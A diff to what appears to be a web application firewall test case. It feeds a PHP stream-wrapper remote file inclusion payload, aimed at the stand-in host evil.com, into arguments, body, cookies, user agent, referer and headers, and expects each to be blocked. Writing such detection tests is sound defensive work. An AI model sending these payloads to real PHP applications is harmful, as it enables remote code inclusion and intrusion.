@@ -1,9 +1,12 @@
 {
     "req": [
       {
-        "ARGS": "param%RND%=php://filter/read=string.rot13/resource=http://evil.com/index.php",
-        "BODY": "param%RND%=php://filter/read=string.rot13/resource=http://evil.com/index.php",
+        "ARGS": "page=php://filter/read=string.rot13/resource=http://evil.com/index.php",
+        "BODY": "page=php://filter/read=string.rot13/resource=http://evil.com/index.php",
+        "COOKIE": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
+        "USER-AGENT": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
         "REFERER": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
+        "HEADER": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
         "ENCODE": "Base64 UTF-16",
         "BLOCKED": true
       }
